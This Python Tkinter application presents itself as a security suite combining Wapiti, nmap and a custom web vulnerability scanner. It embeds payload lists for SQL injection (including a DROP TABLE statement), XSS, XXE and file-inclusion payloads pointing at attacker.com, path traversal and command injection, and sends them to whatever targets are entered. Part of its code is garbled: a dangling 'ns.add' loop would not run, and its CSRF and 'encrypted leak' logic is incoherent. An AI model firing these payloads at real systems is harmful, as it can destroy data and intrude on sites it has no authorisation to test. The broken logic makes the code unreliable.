import tenseal as ts
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog
import requests
import socket
import threading
import matplotlib.pyplot as plt
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
import time
from urllib.parse import urlparse, quote
import logging
import nmap
import json
from datetime import datetime
import os
import subprocess
from fpdf import FPDF
import shutil

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', 
                    filename='security_suite.log')

# Expanded Payloads
sql_payloads = [
    "' OR 1=1 --", "' OR 'a'='a", "1' OR '1'='1", "' UNION SELECT NULL, username, password FROM users --",
    "'; DROP TABLE users; --", "1' AND 1=CONVERT(int, (SELECT @@version)) --",
    "' OR EXISTS(SELECT * FROM users WHERE name='admin') --", "1; WAITFOR DELAY '0:0:5' --"
]

xss_payloads = [
    '<script>alert("XSS")</script>', '<img src="x" onerror=alert(1)>', '<svg onload=alert("XSS")>',
    '"><script>alert(1)</script>', '<body onload=alert("XSS")>', '<iframe src="javascript:alert(1)">',
    'javascript:alert("XSS")', '<input type="text" value="" onfocus=alert(1)>'
]

csrf_payloads = [
    '<form action="TARGET/transfer" method="POST"><input type="hidden" name="amount" value="1000">',
    '<img src="TARGET/delete?user=admin" width="0" height="0">',
    '<form action="TARGET/update" method="POST"><input type="hidden" name="role" value="admin"><input type="submit">',
    '<a href="TARGET/change-password?newpass=123" style="display:none">click</a><script>document.querySelector("a").click()</script>',
    '<iframe src="TARGET/action?param=value" style="display:none"></iframe>'
]

xxe_payloads = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/shadow"><!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd"><%dtd;]><data>&file;</data>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">%xxe;]><foo></foo>'
]

directory_traversal_payloads = [
    "../../../../etc/passwd", "../../../../../../windows/win.ini", "../" * 10 + "etc/hosts",
    "..\\..\\..\\..\\windows\\system32\\cmd.exe", "/var/www/../../etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "....//....//etc/passwd"
]

command_injection_payloads = [
    "; ls", "&& whoami", "| dir", "; cat /etc/passwd", "&& ping -c 10 127.0.0.1",
    "`id`", "$(whoami)", "; sleep 5"
]

file_inclusion_payloads = [
    "?file=../../../../etc/passwd", "?page=php://filter/convert.base64-encode/resource=index.php",
    "?file=/etc/passwd", "?include=../../windows/win.ini", "?file=http://attacker.com/malicious.php",
    "?path=../../../../proc/self/environ", "?file=expect://id"
]

# Utility Functions
def is_root():
    return os.geteuid() == 0 if os.name == 'posix' else os.getuid() == 0 if hasattr(os, 'getuid') else False

def resolve_to_ip(target):
    try:
        parsed = urlparse(target if target.startswith(('http://', 'https://')) else f'http://{target}')
        hostname = parsed.hostname or target
        ip = socket.gethostbyname(hostname)
        logging.info(f"Resolved {target} to IP: {ip}")
        return ip, hostname
    except socket.gaierror as e:
        logging.error(f"Failed to resolve {target}: {str(e)}")
        return None, target
    except Exception as e:
        logging.error(f"Unexpected error resolving {target}: {str(e)}")
        return None, target

# Wapiti Scanner
class WapitiScanner:
    def __init__(self):
        self.wapiti_path = shutil.which("wapiti") or "wapiti"
        self.output_dir = "wapiti_reports"
        os.makedirs(self.output_dir, exist_ok=True)
        self.is_installed = self.check_wapiti_installed()

    def check_wapiti_installed(self):
        try:
            result = subprocess.run(
                [self.wapiti_path, "--version"],
                capture_output=True,
                text=True,
                timeout=5
            )
            if result.returncode == 0 or "wapiti" in (result.stdout + result.stderr).lower():
                logging.info("Wapiti found and operational")
                return True
            return False
        except (subprocess.TimeoutExpired, FileNotFoundError, subprocess.SubprocessError):
            logging.error("Wapiti is not installed or not found in PATH.")
            return False

    def scan_target(self, target, detailed=False):
        if not self.is_installed:
            return "Error: Wapiti is not installed. Please install it using 'pip install wapiti3' or ensure it's in PATH."

        if not target.startswith(('http://', 'https://')):
            target = f"http://{target}"
        
        parsed = urlparse(target)
        if not parsed.scheme or not parsed.netloc:
            return f"Error: Invalid URL '{target}'. Must include http:// or https:// and a valid domain."

        output_file = os.path.join(
            self.output_dir,
            f"wapiti_{target.replace('://', '_').replace('/', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        )

        cmd = [
            self.wapiti_path,
            "-u", target,
            "-f", "json",
            "-o", output_file,
            "--timeout", "5",
            "--flush-session",
            "--no-bugreport"
        ]

        if detailed:
            cmd.extend(["-m", "xss,sql,exec,file", "-v", "1"])
        else:
            cmd.extend(["-m", "xss,sql"])

        try:
            process = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300,
                check=True
            )
            
            logging.info(f"Wapiti scan completed for {target}. Output saved to {output_file}")
            
            if not os.path.exists(output_file) or os.path.getsize(output_file) == 0:
                return f"Error: Wapiti scan completed but no report generated for {target}\nSTDERR: {process.stderr}"

            with open(output_file, 'r', encoding='utf-8') as f:
                try:
                    report = json.load(f)
                    return self.parse_wapiti_report(report, target)
                except json.JSONDecodeError:
                    return f"Error: Failed to parse Wapiti JSON output for {target}\nSTDERR: {process.stderr}"
                
        except subprocess.TimeoutExpired:
            error_msg = f"Error: Wapiti scan timed out for {target}"
            logging.error(error_msg)
            return error_msg
        except subprocess.CalledProcessError as e:
            error_msg = f"Error running Wapiti on {target}: {e.stderr}"
            logging.error(error_msg)
            return error_msg
        except Exception as e:
            error_msg = f"Unexpected error during Wapiti scan on {target}: {str(e)}"
            logging.error(error_msg)
            return error_msg

    def parse_wapiti_report(self, report, target):
        results = [f"Wapiti Scan Results for {target} - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", "-"*50]
        
        if not isinstance(report, dict) or "vulnerabilities" not in report:
            results.append("No vulnerabilities detected or invalid report format.")
            return "\n".join(results)

        vulnerabilities = report.get("vulnerabilities", {})
        if not vulnerabilities:
            results.append("No vulnerabilities detected.")
        else:
            for vuln_type, vuln_list in vulnerabilities.items():
                if not vuln_list:
                    continue
                results.append(f"\n{vuln_type.upper()}:")
                for vuln in vuln_list:
                    info = vuln.get('info', 'No description available')
                    level = vuln.get('level', 'Unknown')
                    url = vuln.get('url', 'Not specified')
                    results.append(f" - {info}")
                    results.append(f"   Level: {level}")
                    results.append(f"   URL: {url}")
                    
        return "\n".join(results)

# Vulnerability Scanner
class VulnerabilityScanner:
    def __init__(self):
        self.session = requests.session()

    def test_sql_injection(self, url):
        if not url.startswith('http'):
            url = f"http://{url}"
        for payload in sql_payloads:
            try:
                response = self.session.get(f"{url}?id={quote(payload)}", timeout=5)
                if any(keyword in response.text.lower() for keyword in ["mysql", "sql", "error", "syntax"]):
                    return f"SQL Injection Detected: {payload}"
            except Exception as e:
                logging.warning(f"SQLi test failed for {url} with payload {payload}: {str(e)}")
        return "No SQL Injection Detected"

    def test_xss(self, url):
        if not url.startswith('http'):
            url = f"http://{url}"
        for payload in xss_payloads:
            try:
                response = self.session.get(f"{url}?q={quote(payload)}", timeout=5)
                if payload in response.text:
                    return f"XSS Detected: {payload}"
            except Exception as e:
                logging.warning(f"XSS test failed for {url} with payload {payload}: {str(e)}")
        return "No XSS Detected"

    def test_csrf(self, url):
        if not url.startswith('http'):
            url = f"http://{url}"
        for payload in csrf_payloads:
            try:
                response = self.session.post(url.replace("TARGET", url), data=payload, timeout=5)
                if response.status_code == 200 and "csrf" not in response.text.lower():
                    return "CSRF Potentially Vulnerable"
            except Exception as e:
                logging.warning(f"CSRF test failed for {url}: {str(e)}")
        return "No CSRF Detected"

    def test_xxe(self, url):
        if not url.startswith('http'):
            url = f"http://{url}"
        for payload in xxe_payloads:
            try:
                response = self.session.post(url, data=payload, headers={'Content-Type': 'application/xml'}, timeout=5)
                if any(keyword in response.text.lower() for keyword in ["root:", "admin", "passwd", "win.ini"]):
                    return "XXE Detected"
            except Exception as e:
                logging.warning(f"XXE test failed for {url}: {str(e)}")
        return "No XXE Detected"

    def test_directory_traversal(self, url):
        if not url.startswith('http'):
            url = f"http://{url}"
        for payload in directory_traversal_payloads:
            try:
                response = self.session.get(f"{url}?file={quote(payload)}", timeout=5)
                if any(keyword in response.text.lower() for keyword in ["root:", "passwd", "win.ini", "hosts"]):
                    return f"Directory Traversal Detected: {payload}"
            except Exception as e:
                logging.warning(f"DirTrav test failed for {url} with payload {payload}: {str(e)}")
        return "No Directory Traversal Detected"

    def test_command_injection(self, url):
        if not url.startswith('http'):
            url = f"http://{url}"
        for payload in command_injection_payloads:
            try:
                response = self.session.get(f"{url}?cmd={quote(payload)}", timeout=5)
                if any(keyword in response.text.lower() for keyword in ["root:", "whoami", "uid=", "dir"]):
                    return f"Command Injection Detected: {payload}"
            except Exception as e:
                logging.warning(f"CmdInj test failed for {url} with payload {payload}: {str(e)}")
        return "No Command Injection Detected"

    def test_file_inclusion(self, url):
        if not url.startswith('http'):
            url = f"http://{url}"
        for payload in file_inclusion_payloads:
            try:
                response = self.session.get(f"{url}{quote(payload)}", timeout=5)
                if any(keyword in response.text.lower() for keyword in ["root:", "passwd", "win.ini", "uid="]):
                    return f"File Inclusion Detected: {payload}"
            except Exception as e:
                logging.warning(f"FileInc test failed for {url} with payload {payload}: {str(e)}")
        return "No File Inclusion Detected"

# Nmap Scanner
class NmapScanner:
    def __init__(self):
        self.nm = nmap.PortScanner()

    def scan_target(self, target, scan_type='tcp'):
        ip, hostname = resolve_to_ip(target)
        if not ip:
            return f"Could not resolve {target} to an IP address."

        try:
            if not is_root() and scan_type in ['syn', 'idle', 'udp']:
                scan_type = 'tcp'
                logging.warning(f"Root privileges not detected. Using TCP Connect scan for {target}")
                messagebox.showwarning("Privilege Warning", 
                                       f"Root privileges required for {scan_type.upper()} scan. Using TCP Connect scan instead.")

            args = {'syn': '-sS -sV', 'idle': '-sI 192.168.1.100 -sV', 'tcp': '-sT -sV', 'udp': '-sU -sV'}.get(scan_type, '-sT -sV')
            self.nm.scan(ip, '1-1000', arguments=args)
            scan_result = [f"Scan Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"]
            for host in self.nm.all_hosts():
                scan_result.append(f"Host: {host} ({self.nm[host].hostname() or hostname})")
                scan_result.append(f"State: {self.nm[host].state()}")
                for proto in self.nm[host].all_protocols():
                    for port in sorted(self.nm[host][proto].keys()):
                        state = self.nm[host][proto][port]['state']
                        service = self.nm[host][proto][port].get('name', 'unknown')
                        scan_result.append(f"Port: {port}/{proto} - {state} ({service})")
            return "\n".join(scan_result)
        except Exception as e:
            return f"Error scanning {target} (IP: {ip}): {str(e)}"

# Security Analyzer
class SecurityAnalyzer:
    def __init__(self):
        self.context = ts.context(ts.SCHEME_TYPE.CKKS, poly_modulus_degree=16384, coeff_mod_bit_sizes=[60, 40, 40, 40, 60])
        self.context.global_scale = 2**40
        self.context.generate_galois_keys()

    def encrypt_data(self, data):
        numeric_data = [hash(item) % 10000 for item in data]
        return [ts.ckks_vector(self.context, [val]) for val in numeric_data]

    def analyze_leaks(self, encrypted_corporate, encrypted_dark):
        leaks = []
        for i, corp_data in enumerate(encrypted_corporate):
            for dark_data in encrypted_dark:
                diff = corp_data - dark_data
                if abs(diff.decrypt()[0]) < 50:
                    leaks.append(i)
                    break
        return leaks

# GUI Application
class SecuritySuiteApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Advanced Security Suite")
        self.root.geometry("1600x1000")
        self.root.configure(bg="#1e1e2e")

        self.wapiti_scanner = WapitiScanner()
        self.analyzer = SecurityAnalyzer()
        self.nmap_scanner = NmapScanner()
        self.vuln_scanner = VulnerabilityScanner()

        self.setup_gui()

    def setup_gui(self):
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('TButton', font=('Helvetica', 12, 'bold'), background='#ff6f61', foreground='white', padding=6)
        style.map('TButton', background=[('active', '#ff8a80')], foreground=[('active', 'white')])
        style.configure('TLabel', background='#1e1e2e', foreground='#00ff00', font=('Helvetica', 12, 'bold'))
        style.configure('TFrame', background='#1e1e2e')
        style.configure("orange.Horizontal.TProgressbar", troughcolor='#2e2e2e', background='#ff6f61')
        style.configure('Custom.TRadiobutton', foreground='#00ff00', background='#1e1e2e')
        style.map('Custom.TRadiobutton', foreground=[('active', '#00d4ff')])

        main_frame = ttk.Frame(self.root, padding="20")
        main_frame.pack(fill="both", expand=True)

        ttk.Label(main_frame, text="Advanced Security Suite", font=("Helvetica", 24, "bold"), foreground="#00d4ff").pack(pady=15)

        notebook = ttk.Notebook(main_frame)
        notebook.pack(fill="both", expand=True)

        monitor_tab = ttk.Frame(notebook)
        notebook.add(monitor_tab, text="Security Dashboard")

        input_frame = ttk.LabelFrame(monitor_tab, text="INPUT TARGETS (URLs/IPs)", padding="10")
        input_frame.pack(fill="x", pady=10)
        self.input_text = scrolledtext.ScrolledText(input_frame, height=6, width=120, bg="black", fg="#00ff00",
                                                  insertbackground="white", font=('Helvetica', 10))
        self.input_text.pack(pady=5)

        controls_frame = ttk.Frame(monitor_tab)
        controls_frame.pack(pady=10)
        ttk.Button(controls_frame, text="Full Scan", command=lambda: threading.Thread(target=self.start_full_scan).start(), 
                   style='TButton').pack(side="left", padx=5)
        ttk.Button(controls_frame, text="Wapiti Scan", command=lambda: threading.Thread(target=self.start_wapiti_scan).start(), 
                   style='TButton').pack(side="left", padx=5)
        ttk.Button(controls_frame, text="Nmap Scan", command=lambda: threading.Thread(target=self.start_nmap_scan).start(), 
                   style='TButton').pack(side="left", padx=5)
        ttk.Button(controls_frame, text="Vuln Scan", command=lambda: threading.Thread(target=self.start_vuln_scan).start(), 
                   style='TButton').pack(side="left", padx=5)
        ttk.Button(controls_frame, text="Clear Results", command=self.clear_results, style='TButton').pack(side="left", padx=5)
        ttk.Button(controls_frame, text="Export Report", command=self.export_report, style='TButton').pack(side="left", padx=5)

        ttk.Label(controls_frame, text="NMAP SCAN TYPE:").pack(side="left", padx=5)
        self.scan_type_var = tk.StringVar(value='tcp')
        scan_types = [('SYN', 'syn'), ('Idle', 'idle'), ('TCP', 'tcp'), ('UDP', 'udp')]
        for text, value in scan_types:
            ttk.Radiobutton(controls_frame, text=text, variable=self.scan_type_var, value=value, 
                            style='Custom.TRadiobutton').pack(side="left", padx=2)

        self.progress = ttk.Progressbar(monitor_tab, length=800, mode='determinate', style="orange.Horizontal.TProgressbar")
        self.progress.pack(pady=10)
        self.status_var = tk.StringVar(value="Status: Idle")
        ttk.Label(monitor_tab, textvariable=self.status_var, foreground="#ffcc00").pack(pady=5)

        result_frame = ttk.Frame(monitor_tab)
        result_frame.pack(fill="both", expand=True, pady=10)
        wapiti_frame = ttk.LabelFrame(result_frame, text="WAPITI WEB SCAN", padding="5")
        wapiti_frame.grid(row=0, column=0, padx=5, sticky="nsew")
        self.wapiti_text = scrolledtext.ScrolledText(wapiti_frame, height=20, width=50, bg="black", fg="#00ff00", 
                                                     font=('Helvetica', 10))
        self.wapiti_text.pack(fill="both", expand=True)

        nmap_frame = ttk.LabelFrame(result_frame, text="NMAP SCAN", padding="5")
        nmap_frame.grid(row=0, column=1, padx=5, sticky="nsew")
        self.nmap_text = scrolledtext.ScrolledText(nmap_frame, height=20, width=50, bg="black", fg="#00ff00", 
                                                  font=('Helvetica', 10))
        self.nmap_text.pack(fill="both", expand=True)

        vuln_frame = ttk.LabelFrame(result_frame, text="VULNERABILITY SCAN", padding="5")
        vuln_frame.grid(row=0, column=2, padx=5, sticky="nsew")
        self.vuln_text = scrolledtext.ScrolledText(vuln_frame, height=20, width=50, bg="black", fg="#00ff00", 
                                                  font=('Helvetica', 10))
        self.vuln_text.pack(fill="both", expand=True)

        for i in range(3):
            result_frame.grid_columnconfigure(i, weight=1)

        viz_tab = ttk.Frame(notebook)
        notebook.add(viz_tab, text="Visual Analytics")
        viz_frame = ttk.Frame(viz_tab)
        viz_frame.pack(fill="both", expand=True)

        fig, (self.ax1, self.ax2, self.ax3, self.ax4) = plt.subplots(1, 4, figsize=(20, 5), facecolor='#1e1e2e')
        self.canvas = FigureCanvasTkAgg(fig, master=viz_frame)
        self.canvas.get_tk_widget().pack(side=tk.LEFT, fill="both", expand=True)
        for ax in (self.ax1, self.ax2, self.ax3, self.ax4):
            ax.set_facecolor('#2e2e2e')
            ax.tick_params(colors='#e0e0e0')
            ax.title.set_color('#e0e0e0')
            ax.spines['top'].set_color('#e0e0e0')
            ax.spines['right'].set_color('#e0e0e0')
            ax.spines['left'].set_color('#e0e0e0')
            ax.spines['bottom'].set_color('#e0e0e0')
        plt.tight_layout()

        mitigation_frame = ttk.LabelFrame(viz_frame, text="MITIGATION STRATEGIES & GRADING", padding="5")
        mitigation_frame.pack(side=tk.RIGHT, fill="both", expand=True, padx=10)
        self.mitigation_text = scrolledtext.ScrolledText(mitigation_frame, height=20, width=50, bg="black", fg="#00ff00", 
                                                        font=('Helvetica', 10))
        self.mitigation_text.pack(fill="both", expand=True)

    def start_full_scan(self):
        self.status_var.set("Status: Full Scan in Progress...")
        self.progress['value'] = 0
        targets = self.input_text.get("1.0", tk.END).strip().splitlines()
        if not targets or all(not t.strip() for t in targets):
            messagebox.showerror("Error", "Please enter URLs or IPs to scan!")
            self.status_var.set("Status: Idle")
            return

        total_steps = len(targets) * 3
        self.progress['maximum'] = total_steps
        step = 0

        self.start_wapiti_scan(update_progress=False)
        step += len(targets)
        self.progress['value'] = step
        self.root.update()

        self.start_nmap_scan(update_progress=False)
        step += len(targets)
        self.progress['value'] = step
        self.root.update()

        self.start_vuln_scan(update_progress=False)
        step += len(targets)
        self.progress['value'] = step
        self.root.update()

        self.update_visualizations(targets)
        self.status_var.set("Status: Full Scan Complete")

    def start_wapiti_scan(self, update_progress=True):
        self.status_var.set("Status: Wapiti Scan in Progress...")
        targets = self.input_text.get("1.0", tk.END).strip().splitlines()
        if not targets or all(not t.strip() for t in targets):
            messagebox.showerror("Error", "Please enter URLs to scan!")
            self.status_var.set("Status: Idle")
            return

        self.wapiti_text.delete("1.0", tk.END)
        self.wapiti_text.insert(tk.END, "Initializing Wapiti Scan...\n", "header")
        self.root.update()

        total_steps = len(targets) if update_progress else 0
        if update_progress:
            self.progress['maximum'] = total_steps
            self.progress['value'] = 0

        for i, target in enumerate(targets):
            result = self.wapiti_scanner.scan_target(target, detailed=True)
            self.wapiti_text.delete("1.0", tk.END)
            self.wapiti_text.insert(tk.END, result + "\n", "normal")
            self.wapiti_text.tag_config("header", foreground="#00d4ff", font=("Helvetica", 12, "bold"))
            self.wapiti_text.tag_config("normal", foreground="#00ff00")
            if update_progress:
                self.progress['value'] = i + 1
            self.root.update()

        self.status_var.set("Status: Wapiti Scan Complete")

    def start_nmap_scan(self, update_progress=True):
        self.status_var.set("Status: Nmap Scan in Progress...")
        targets = self.input_text.get("1.0", tk.END).strip().splitlines()
        if not targets or all(not t.strip() for t in targets):
            messagebox.showerror("Error", "Please enter URLs or IPs to scan!")
            self.status_var.set("Status: Idle")
            return

        self.nmap_text.delete("1.0", tk.END)
        self.nmap_text.insert(tk.END, "Initializing Nmap Scan...\n", "header")
        self.root.update()

        total_steps = len(targets) if update_progress else 0
        if update_progress:
            self.progress['maximum'] = total_steps
            self.progress['value'] = 0

        for i, target in enumerate(targets):
            scan_result = self.nmap_scanner.scan_target(target, self.scan_type_var.get())
            self.nmap_text.delete("1.0", tk.END)
            self.nmap_text.insert(tk.END, "Nmap Scan Results:\n", "header")
            self.nmap_text.insert(tk.END, f"\nTarget: {target}\n{scan_result}\n{'-'*50}\n", "normal")
            self.nmap_text.tag_config("header", foreground="#00d4ff", font=("Helvetica", 12, "bold"))
            self.nmap_text.tag_config("normal", foreground="#00ff00")
            if update_progress:
                self.progress['value'] = i + 1
            self.root.update()

        self.status_var.set("Status: Nmap Scan Complete")

    def start_vuln_scan(self, update_progress=True):
        self.status_var.set("Status: Vulnerability Scan in Progress...")
        targets = self.input_text.get("1.0", tk.END).strip().splitlines()
        if not targets or all(not t.strip() for t in targets):
            messagebox.showerror("Error", "Please enter URLs to scan!")
            self.status_var.set("Status: Idle")
            return

        self.vuln_text.delete("1.0", tk.END)
        self.vuln_text.insert(tk.END, "Initializing Vulnerability Scan...\n", "header")
        self.root.update()

        total_steps = len(targets) if update_progress else 0
        if update_progress:
            self.progress['maximum'] = total_steps
            self.progress['value'] = 0

        vuln_results = {}
        vuln_counts = {}
        for i, target in enumerate(targets):
            ip, hostname = resolve_to_ip(target)
            if ip:
                vuln_results[target] = {
                    "SQLi": self.vuln_scanner.test_sql_injection(target),
                    "XSS": self.vuln_scanner.test_xss(target),
                    "CSRF": self.vuln_scanner.test_csrf(target),
                    "XXE": self.vuln_scanner.test_xxe(target),
                    "DirTrav": self.vuln_scanner.test_directory_traversal(target),
                    "CmdInj": self.vuln_scanner.test_command_injection(target),
                    "FileInc": self.vuln_scanner.test_file_inclusion(target)
                }
                vuln_counts[target] = sum("Detected" in v for v in vuln_results[target].values())
                self.vuln_text.delete("1.0", tk.END)
                self.vuln_text.insert(tk.END, "Vulnerability Scan Results:\n", "header")
                self.vuln_text.insert(tk.END, f"\nTarget: {target} (IP: {ip})\n", "normal")
                for vuln, result in vuln_results[target].items():
                    tag = "vuln" if "Detected" in result else "normal"
                    self.vuln_text.insert(tk.END, f"{vuln}: {result}\n", tag)
                self.vuln_text.insert(tk.END, '-'*50 + "\n", "normal")
            else:
                vuln_counts[target] = 0
                self.vuln_text.insert(tk.END, f"\nTarget: {target}\nCould not resolve IP - Skipping vuln scan\n{'-'*50}\n", "normal")
            self.vuln_text.tag_config("header", foreground="#00d4ff", font=("Helvetica", 12, "bold"))
            self.vuln_text.tag_config("vuln", foreground="#ff6f61", font=("Helvetica", 10, "bold"))
            self.vuln_text.tag_config("normal", foreground="#00ff00")
            if update_progress:
                self.progress['value'] = i + 1
            self.root.update()

        self.status_var.set("Status: Vulnerability Scan Complete")
        return vuln_results, vuln_counts

    def update_visualizations(self, targets):
        vuln_results, vuln_counts = self.start_vuln_scan(update_progress=False)

        self.ax1.clear()
        self.ax2.clear()
        self.ax3.clear()
        self.ax4.clear()

        # Enhanced Pie Chart 1: Wapiti Vulnerability Distribution
        wapiti_vulns = sum(1 for line in self.wapiti_text.get("1.0", tk.END).splitlines() if "Level:" in line)
        wapiti_safe = len(targets) - wapiti_vulns
        wedges1, _, _ = self.ax1.pie([wapiti_safe, wapiti_vulns], labels=["", ""], autopct='%1.1f%%', 
                                     colors=['#00cc99', '#ff4d4d'], startangle=90, explode=(0.1, 0), shadow=True,
                                     textprops={'color': '#ffffff', 'fontsize': 12, 'weight': 'bold', 'family': 'Arial'},
                                     wedgeprops={'edgecolor': '#e0e0e0', 'linewidth': 2})
        self.ax1.set_title("Wapiti Vuln Distribution", fontsize=14, pad=20 
, color='#e0e0e0', weight='bold')
        self.ax1.legend(wedges1, ["Safe", "Vulnerable"], loc="upper left", bbox_to_anchor=(-0.1, 1), fontsize=10, frameon=False, labelcolor='white')

        # Enhanced Pie Chart 2: Custom Vulnerability Scan Results
        total_vulns_detected = sum(vuln_counts.values())
        total_vulns_possible = len([t for t in targets if resolve_to_ip(t)[0]]) * 7
        safe_count = total_vulns_possible - total_vulns_detected
        wedges2, _, _ = self.ax2.pie([safe_count, total_vulns_detected], labels=["", ""], autopct='%1.1f%%', 
                                     colors=['#00cc00', '#ff9900'], startangle=90, explode=(0.1, 0), shadow=True,
                                     textprops={'color': '#ffffff', 'fontsize': 12, 'weight': 'bold', 'family': 'Arial'},
                                     wedgeprops={'edgecolor': '#e0e0e0', 'linewidth': 2})
        self.ax2.set_title("Custom Vuln Scan Results", fontsize=14, pad=20, color='#e0e0e0', weight='bold')
        self.ax2.legend(wedges2, ["Safe", "Vulnerable"], loc="upper left", bbox_to_anchor=(-0.1, 1), fontsize=10, frameon=False, labelcolor='white')

        # Enhanced Pie Chart 3: Port Status
        port_counts = sum(1 for line in self.nmap_text.get("1.0", tk.END).splitlines() if "Port:" in line and "open" in line)
        total_possible_ports = len(targets) * 1000
        closed_ports = total_possible_ports - port_counts
        wedges3, _, _ = self.ax3.pie([port_counts, closed_ports], labels=["", ""], autopct='%1.1f%%', 
                                     colors=['#00cc99', '#666666'], startangle=90, explode=(0.1, 0), shadow=True,
                                     textprops={'color': '#ffffff', 'fontsize': 12, 'weight': 'bold', 'family': 'Arial'},
                                     wedgeprops={'edgecolor': '#e0e0e0', 'linewidth': 2})
        self.ax3.set_title("Port Status", fontsize=14, pad=20, color='#e0e0e0', weight='bold')
        self.ax3.legend(wedges3, ["Open", "Closed"], loc="upper left", bbox_to_anchor=(-0.1, 1), fontsize=10, frameon=False, labelcolor='white')

        # Enhanced Pie Chart 4: Overall Security Level
        overall_vulns = total_vulns_detected + wapiti_vulns
        overall_safe = total_vulns_possible - overall_vulns
        wedges4, _, _ = self.ax4.pie([overall_safe, overall_vulns], labels=["", ""], autopct='%1.1f%%', 
                                     colors=['#00cc00', '#ff4d4d'], startangle=90, explode=(0.1, 0), shadow=True,
                                     textprops={'color': '#ffffff', 'fontsize': 12, 'weight': 'bold', 'family': 'Arial'},
                                     wedgeprops={'edgecolor': '#e0e0e0', 'linewidth': 2})
        self.ax4.set_title("Overall Security Level", fontsize=14, pad=20, color='#e0e0e0', weight='bold')
        self.ax4.legend(wedges4, ["Secure", "Vulnerable"], loc="upper left", bbox_to_anchor=(-0.1, 1), fontsize=10, frameon=False, labelcolor='white')

        self.canvas.draw()

        self.mitigation_text.delete("1.0", tk.END)
        self.mitigation_text.insert(tk.END, "Mitigation Strategies:\n", "header")
        mitigation_strategies = {
            "SQLi": "Use parameterized queries or ORM frameworks.",
            "XSS": "Sanitize user input and implement CSP.",
            "CSRF": "Use CSRF tokens and validate HTTP methods.",
            "XXE": "Disable external entity parsing in XML parsers.",
            "DirTrav": "Restrict file system access and validate file paths.",
            "CmdInj": "Avoid executing user input in system shells.",
            "FileInc": "Use whitelists for file inclusion."
        }
        detected_vulns = set()
        for target, results in vuln_results.items():
            for vuln, result in results.items():
                if "Detected" in result:
                    detected_vul = vuln.split(":")[0]
                    detected_vulns.add(detected_vul)
        for target, results in vuln_results.items():
                    ns.add(vuln)
        if detected_vulns:
            for vuln in detected_vulns:
                self.mitigation_text.insert(tk.END, f"\n{vuln}: {mitigation_strategies[vuln]}\n", "vuln")
        else:
            self.mitigation_text.insert(tk.END, "\nNo vulnerabilities detected.\n", "normal")

        grade, color, score = self.calculate_vulnerability_grade(wapiti_vulns, vuln_counts, port_counts, targets)
        self.mitigation_text.insert(tk.END, "\n" + "-"*50 + "\n", "normal")
        self.mitigation_text.insert(tk.END, f"Overall Vulnerability Grade: {grade}\n", "grade")
        self.mitigation_text.insert(tk.END, f"Score: {score:.1f}/100 (Lower is better)\n", "normal")
        self.mitigation_text.insert(tk.END, f"Targets Scanned: {len(targets)}\n", "normal")
        self.mitigation_text.insert(tk.END, f"Wapiti Vulns: {wapiti_vulns}\n", "normal")
        self.mitigation_text.insert(tk.END, f"Custom Vulns: {total_vulns_detected}\n", "normal")
        self.mitigation_text.insert(tk.END, f"Open Ports: {port_counts}\n", "normal")

        self.mitigation_text.tag_config("header", foreground="#00d4ff", font=("Helvetica", 12, "bold"))
        self.mitigation_text.tag_config("vuln", foreground="#ff6f61", font=("Helvetica", 10, "bold"))
        self.mitigation_text.tag_config("normal", foreground="#00ff00")
        self.mitigation_text.tag_config("grade", foreground=color, font=("Helvetica", 12, "bold"))

    def clear_results(self):
        for text in (self.wapiti_text, self.nmap_text, self.vuln_text, self.mitigation_text):
            text.delete("1.0", tk.END)
        for ax in (self.ax1, self.ax2, self.ax3, self.ax4):
            ax.clear()
        self.canvas.draw()
        self.status_var.set("Status: Idle")
        self.progress['value'] = 0

    def export_report(self):
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        report = {
            "timestamp": timestamp,
            "input": self.input_text.get("1.0", tk.END).strip().splitlines(),
            "wapiti": self.wapiti_text.get("1.0", tk.END).strip(),
            "nmap": self.nmap_text.get("1.0", tk.END).strip(),
            "vulnerabilities": self.vuln_text.get("1.0", tk.END).strip(),
            "mitigations": self.mitigation_text.get("1.0", tk.END).strip()
        }
        file_path = filedialog.asksaveasfilename(defaultextension=".json", filetypes=[("JSON files", "*.json")])
        if file_path:
            with open(file_path, 'w') as f:
                json.dump(report, f, indent=4)
            pdf = FPDF()
            pdf.add_page()
            pdf.set_font("Arial", size=12)
            for key, value in report.items():
                pdf.cell(200, 10, txt=f"{key.capitalize()}:\n{value}", ln=True)
            pdf.output(file_path.replace('.json', '.pdf'))
            messagebox.showinfo("Export", f"Report saved as {file_path} and PDF")

if __name__ == "__main__":
    root = tk.Tk()
    app = SecuritySuiteApp(root)
    root.mainloop()